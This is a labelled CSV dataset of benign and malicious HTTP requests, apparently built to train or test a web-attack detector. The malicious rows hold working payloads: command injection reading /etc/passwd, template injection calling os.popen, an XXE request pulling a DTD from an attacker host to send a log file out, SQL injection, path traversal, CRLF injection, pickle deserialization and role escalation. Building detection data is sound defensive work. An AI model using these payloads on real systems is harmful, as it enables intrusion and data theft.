label,text
benign,"GET /products/furniture/chairs HTTP/1.1
Host: homestyle-furnishings.co.uk
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cookie: visitor_id=home4user123; cart_contents=chair_wooden:2,table_glass:1; promo_code=SUMMER23; last_order_id=987654321"
benign,"POST /profile/edit/info HTTP/1.1
Host: global-freelance-community.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://global-freelance-community.org
Referer: https://global-freelance-community.org/profile/edit/info
Cookie: flc_session=1a0bc2fe7d8e4f139e93bd656fa29d7a; HttpOnly
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-US,en;q=0.5
Connection: keep-alive

display_name=CreativeCoder&bio=Freelance+web+developer+and+designer.&website_url=https%3A%2F%2Fcreativecoder.dev&location=Amsterdam%2C+Netherlands"
malicious,"GET /diag/ping_host?target=8.8.8.8;%20cat%20/etc/passwd HTTP/1.1
Host: net-tools-ops.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: analytics-collector01.community.game-dev-forum.org
User-Agent: python-requests/2.31.0
Content-Type: text/plain
Content-Length: 18
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close

Player score updated 2750."
benign,"POST /submit/comment HTTP/1.1
Host: forum.creative-sparks.community
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://forum.creative-sparks.community/thread/98765
Connection: close
Cookie: sessionid=7d2b49e7f68470a7cef64ea4ae59b2f1; preference=lang%3Den

username=crafty_user&comment=Loved+the+tips+in+this+post%21+Looking+forward+to+more+%26+learning+new+techniques%23art&notify_reply=yes"
malicious,"GET /search/products?query_string=shoesaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.20
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"GET /api/v1/inventory/items?status=available&limit=15 HTTP/1.1
Host: data-stream-hub.io
Accept: application/json
X-Api-Token: 927fa4b1c3e84ba8a1d57d994eb43566
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /gallery/photos?album=summer_vacation&year=2023&resolution=1080p&sort=upload_date_desc&include_favorites=true&filter_location=hawaii&min_likes=100&max_likes=1000&page=3&per_page=30&format=jpeg HTTP/1.1
Host: vibrant-views-photo.co
Cache-Control: max-age=0
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
benign,"POST /users/avatars/upload HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Content-Type: multipart/form-data; boundary=-----BoundaryGoogleBot765
Content-Length: 384
Referer: https://my-personal-blog-site.info/settings/avatar
Cookie: blog_session=aksjahsdk123987abc
Connection: keep-alive

------BoundaryGoogleBot765
Content-Disposition: form-data; name=""caption""

Profile photo for blog author
------BoundaryGoogleBot765
Content-Disposition: form-data; name=""image_file""; filename=""author_profile.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------BoundaryGoogleBot765--"
benign,"GET /api/v3/library/books?available=true&page=2&sort=author HTTP/1.1
Host: api.city-library-services.io
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
X-API-Key: uR7XKB91wnqMZDO2Fb65ESpJhUWVetgYRLDIqQCf
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
benign,"PUT /data/backups/db_backup_04_22_2024.sql.b64 HTTP/1.1
Host: backup-api.cloud-repository.ai
Content-Type: application/octet-stream
Content-Length: 116
X-Requested-With: XMLHttpRequest
Authorization: ApiKey 9f2c88a7d603442fbb3528e074d895a2
User-Agent: curl/7.81.0
Accept: */*
Connection: close

U1FJLVBMQUFTRUxFIEFTREZETEFTIEFGSEJERkFOTCBERklIQU5GSDY0Cg=="
malicious,"PUT /api/v1/config HTTP/1.1
Host: config-service-internal.ai
User-Agent: ConfigUpdater/4.0 $(df -h /)
Content-Type: application/json
Accept: application/json
Content-Length: 55
X-Requested-With: FetchAPIClient

{""config"":{""max_connections"":100,""enable_cache"":true}}"
malicious,"GET /auth/redirect?next=https%3A%2F%2Fdashboard.easy-clouds.net%2Fhome%0d%0aSet-Cookie%3A%20sessionToken=malicious12345 HTTP/1.1
Host: auth.easy-clouds.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close"
benign,"POST /api/v1/feedback HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer aeu73nd12mPz9QrZt6GXHeL67pK3WxJj
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Content-Length: 94
Connection: close

{""feedback.message"":""Great content!"",""user.details['country']"":""FR"",""meta.time-submitted"":""2024-06-04T18:33:22Z""}"
benign,"GET /articles/tech/ai-trends-2024 HTTP/1.1
Host: digital-insights.co.uk
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8
Cache-Control: max-age=0
Referer: https://digital-insights.co.uk/
Connection: close"
benign,"POST /api/account/settings HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer ZjQ2NDMyMmQxZTdlNzZiZg==
Content-Type: application/json
Accept: application/json, text/plain
DNT: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Content-Length: 121
Connection: keep-alive

{""user.settings"": {""chat-notifications"": false, ""display_name"": ""Player_One"", ""privacy-level"": ""friends-only""}, ""meta_info[data_version]"": ""v3.4.5""}"
benign,"GET /product/7543 HTTP/1.1
Host: ecohousewares.online
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Cookie: sid=bb831f3da2654281a0b98600977f5890; cart_id=53fbb1a8002f46df804236ae530d77c2
Referer: https://ecohousewares.online/home/kitchen
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
benign,"POST /form/contact/submit HTTP/1.1
Host: community.healthcare-forum.org
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 33
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Referer: https://community.healthcare-forum.org/contact

{""UNION ALL"": ""request information""}"
malicious,"POST /secure/query/eval HTTP/1.1
Host: dataapi.online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Content-Type: application/json
Referer: https://admin.online-retail-store.biz/panel
Content-Length: 130

{""query"":""/customers/customer[username='admin' and starts-with(password,'pass')]/customerId""}"
benign,"POST /api/v1/inventory/createProduct HTTP/1.1
Host: supplychain-management.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fakesignature1234
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Length: 299
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Product>
  <Name>Portable Solar Charger</Name>
  <Category>Electronics</Category>
  <Price>49.99</Price>
  <SKU>PSC-2024-0098</SKU>
  <Stock>250</Stock>
  <Dimensions>
    <Length unit=""cm"">15</Length>
    <Width unit=""cm"">7</Width>
    <Height unit=""cm"">2</Height>
  </Dimensions>
</Product>"
benign,"GET /home HTTP/1.1
Host: the-cultural-chronicle.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://the-cultural-chronicle.com/news/arts
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15"
benign,"OPTIONS /api/public/events/list HTTP/1.1
Host: event-management.services
Origin: https://app.social-networking-site.net
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Accept, Content-Type
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json
Connection: keep-alive"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Content-Length: 69
Connection: keep-alive

nickname=PixelNinja&preferences%5Bnotifications%5D=enabled&role_id=1&internal_user_status=ACTIVE"
benign,"GET /themes/base/jquery-ui.min.css HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.68.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/discussion/123
Connection: keep-alive"
benign,"GET /events/conferences/2024/registration HTTP/1.1
Host: tech-forward-events.org
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xml;q=0.9
Accept-Language: en-US,en;q=0.6
DNT: 1
Connection: keep-alive"
benign,"POST /polls/77/submit HTTP/1.1
Host: local-community-polls.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Referer: https://local-community-polls.co.uk/polls/77
Cookie: sessionId=8a4e2d69f1c32b7c

poll_id=77&choice_id=1"
benign,"GET /favicon.ico HTTP/1.1
Host: urban-events-network.net
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.5"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: infrastructure-monitoring.cloud
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/json-patch+json
User-Agent: python-requests/2.31.0
Authorization: Bearer abcd1234efgh5678ijkl9012mnop3456qrst7890
Content-Length: 68

[{""op"":""remove"",""path"":""/alerts/emailThreshold""},{""op"":""add"",""path"":""/alerts/smsEnabled"",""value"":true}]"
benign,"POST /api/contact/send HTTP/1.1
Host: urbanstyle-fashions.jp
Content-Type: application/xml
Content-Length: 137
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/xml, text/html
Referer: https://urbanstyle-fashions.jp/contact

<contactRequest>
  <name>Haruki Tanaka</name>
  <email>haruki.t@urbanstyle-fashions.jp</email>
  <subject>Store locations inquiry</subject>
  <message>Could you please provide your store locations in Tokyo?</message>
</contactRequest>"
benign,"POST /projects/data/upload CSV HTTP/1.1
Host: creative-websolutions.design
Content-Type: text/csv
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
Content-Length: 125
Referer: https://creative-websolutions.design/projects/list
Via: 1.1 example-proxy.net

proj_id,title,status,start_date
501,Website Redesign,In Progress,2024-03-10
502,App Launch,Completed,2023-12-22"
benign,"GET /resources/images/hero-banner.webp HTTP/1.1
Host: vintage-craftsmarket.net
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: keep-alive
Cache-Control: max-age=604800"
benign,"POST /user/authenticate HTTP/1.1
Host: login.enterprise-data-solutions.com
Content-Type: application/json
Accept: application/json
Origin: https://app.enterprise-data-solutions.com
X-CSRF-Token: 1a6d8f12e2bc9d5647ef098e32cc5ba4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Length: 83

{""email"":""tarahartwell@enterprise-data-solutions.com"",""password"":""RoYalT1g3r67!""}"
benign,"GET /search/items?q=building+lego+city+sets HTTP/1.1
Host: brickmania-kits.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html
Referer: https://brickmania-kits.org/home
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /logout HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/dashboard
Cookie: sessionid=a4b2789d2f1c4e8e96712f03b2a59d10; lang=en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 29

csrf_token=Z7s2dpMpiVcHLxq0QfcdRg=="
malicious,"GET /search?q=latest HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/plain, */*
Referer: https://api.cloud-data-services.ai/dash{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20/etc/passwd').read() }} #}
Accept-Language: en-US,en;q=0.9"
malicious,"POST /service/upload HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 263

<!DOCTYPE doc [
<!ENTITY % file SYSTEM ""file:///var/log/auth.log"">
<!ENTITY % dtd SYSTEM ""http://attacker-portal.biz/malicious.dtd"">
%dtd;
%send;
]>
<request>
  <name>upload</name>
  <value>filedata</value>
</request>"
benign,"GET /members/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: secure-login-system.net
User-Agent: python-requests/2.28.2
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
benign,"PUT /account/profile HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 82
Cache-Control: no-cache
Cookie: user_session=5e9d8fd2a3c24c0bb9a1f1e7722a4c9f; preferences=language=en-US

{""bio"": ""Collector of rare books &amp; lover of &lt;b&gt;classic literature&lt;/b&gt; all day.""}"
benign,"GET /api/v1/vehicles/9482398 HTTP/1.1
Host: urban-transport-hub.me
Accept: application/json
Authorization: Bearer mF_9.B5f-4.1JqM
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /v3/inventory/items/0a1b2c3d HTTP/1.1
Host: inventory-cloud.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
malicious,"GET /user/profile?account=active&%61%63%63%6F%75%6E%74=%27%20OR%201=1-- HTTP/1.1
Host: secure-transactions.cloud
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Pragma: no-cache
Connection: keep-alive"
benign,"DELETE /resources/v2/items/98432 HTTP/1.1
Host: api-data-sync.enterprise-solutions.biz
Authorization: Token c3VwZXJzZWNyZXR0b2tlbg==
If-Match: ""etag-90210""
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"GET /search/query?token=QWxhZGRpbjpPcGVuU2VzYW1lLi4uWGVEcGQybUtiV2l4S1ZhaDdWU0toTklqN2xiM2kvMk53L3E3ZE9MQjVqV3VEaE11dlUvYXoyb2MwZHdCej0%3D HTTP/1.1
Host: partner-marketing.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Referer: https://partner-marketing.net/home"
benign,"POST /as/token HTTP/1.1
Host: identity-authentication-center.dev
Content-Type: application/x-www-form-urlencoded
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Authorization: Basic SUQtQVVUSDo0NjMwYmQxZi1mZWMyLTQ1ZjItYmU3OC04OWRhNjYzMzkwNzc=
Accept: application/json
Content-Length: 134
Connection: close

grant_type=refresh_token&refresh_token=dU5CdThxNmNkVTFNNVhGRkVVc0c5dEhHYlc4WmZpZHNjVmhIQm1mR21jMg==&client_id=ID-AUTH&client_secret=4630bd1f-fec2-45f2-be78-89da66339077&redirect_uri=https%3A%2F%2Fidentity-authentication-center.dev%2Fdashboard"
benign,"POST /api/register-new HTTP/1.1
Host: healthcare-connect-service.org
Content-Type: application/json
Accept: application/json
Origin: https://healthcare-connect-service.org
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Length: 161
Connection: keep-alive

{""username"":""david_nguyen"",""email"":""david.nguyen@healthcare-connect-service.org"",""password"":""Health4All2023!"",""insuranceNumber"":""HCS789654123""}"
benign,"DELETE /api/v1/accounts/95431 HTTP/1.1
Host: auth-financehub.cloud
Authorization: Bearer mXc4PvGhNeHZ3AslP0b1WxLrtJfQU8ZE
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"POST /submission/form/api HTTP/1.1
Host: survey-cloud.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 522
Accept: application/json
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Forwarded-For: 198.51.100.23
Cookie: survey_session=xyz457892345

field1=Green&field2=Yes&field3=42&field4=No&field5=2024-06-16&field6=Maybe&field7=High&field8=Low&field9=7&field10=5&field11=Blue&field12=No&field13=Text+input&field14=Email&field15=Phone&field16=Address+line+1&field17=Address+line+2&field18=New+York&field19=NY&field20=10011&field21=USA&field22=Option+A&field23=Option+B&field24=Option+C&field25=No+comments"
benign,"POST /photos/upload HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Accept: image/*,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----MobileBoundary0987
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/user/uploads
Cookie: auth_key=0987asdcfghjklpoiuytrewq12345
Connection: keep-alive

------MobileBoundary0987
Content-Disposition: form-data; name=""caption""

Store window display update
------MobileBoundary0987
Content-Disposition: form-data; name=""image_file""; filename=""storefront_photo.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------MobileBoundary0987--"
malicious,"PATCH /api/v2/accounts/update-profile HTTP/1.1
Host: secure-cloud-portal.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2N0IjoiMTIzNDU2IiwiZXhwIjoxNjgyODU0ODAwfQ.SFlKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""phone"": ""+1-555-0199"",
    ""contact"": {
      ""email"": ""hacker@secure-cloud-portal.ai"",
      ""address"": ""123 Malicious Rd""
    }
  },
  ""account_info"": {
    ""subscription_level"": ""premium"",
    ""override_settings"": {
      ""is_feature_xyz_enabled"": true,
      ""credits_override"": 99999
    }
  }
}"
malicious,"GET /status/check HTTP/1.1
Host: analytics.enterprise-vault.net
User-Agent: Python-requests/2.25.1
Accept: text/plain
Referer: https://portal.enterprise-vault.net/home
X-Pickled-Data: \x80\x03cnative\nsystem
q\x00X\x0cid\x94\x85q\x01Rq\x02."
benign,"HEAD /v3/user/session HTTP/1.1
Host: user-management.api-platform.xyz
User-Agent: Wget/1.21.2 (linux-gnu)
Accept: */*
Connection: close"
malicious,"POST /member/settings HTTP/1.1
Host: secure-data-exchange.cloud
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept-Language: en-US,en;q=0.6
Content-Length: 76

fullname=George+King&email_verified=true&role_id=1&internal_user_status=ACTIVE"
benign,"GET /profile/view/maria.gauthier HTTP/1.1
Host: urbanvoices-social.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Referer: https://urbanvoices-social.io/discussions/recent
Cookie: uv_session=3jf8s9dlfj239jfsk2j42lklx; auth_token=3q2r948sdvn7cx9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4"
benign,"PUT /api/projects/725 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer mnVopXZEcukLQ6PJ98FS7lh5TjaCYWMvdfbo1FxR
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{""id"":725,""title"":""Open World Quest System"",""description"":""Complete overhaul of quest tracking and dynamic events"",""status"":""in progress"",""teamMembers"":[""KaraD"",""ElliottT"",""RyannP""],""deadline"":""2024-11-12""}"
benign,"GET /media/images/backgrounds?id=img_noonforest_001 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/blog/article/view/1972
Connection: keep-alive"
malicious,"GET /api/v3/items/serve?file=../../../../../../../../etc/passwd HTTP/1.1
Host: data-aggregation-hub.net
User-Agent: Python-urllib/3.9
Accept: application/json
Cache-Control: max-age=0
Origin: https://data-aggregation-hub.net
Connection: keep-alive"
benign,"GET /news/technology/ai-breakthrough-2024 HTTP/1.1
Host: insights-daily.techmedia.info
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: close"
benign,"POST /session/js HTTP/1.1
Host: interactive-learning-app.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/javascript
Content-Length: 34
Referer: https://interactive-learning-app.org/session
Content-Language: en-US

console.log('Session script executed');"
benign,"POST /api/v2/feedback/send HTTP/1.1
Host: user-feedback-hub.net
Content-Type: application/x-www-form-urlencoded
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 39
X-CSRF-Token: 7f1a3d79ecb5a2345dd2

userId=998877&comments=Great+service&rating="
benign,"GET /data/v1/location/search?data=latitude%3D34.052235%26longitude%3D-118.243683%26radius_km%3D25%26types%3Dpark%2Cmuseum%2Chistoric_site%2Cbotanical_garden%2Cart_gallery HTTP/1.1
Host: urban-places.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept-Encoding: gzip
Connection: keep-alive"
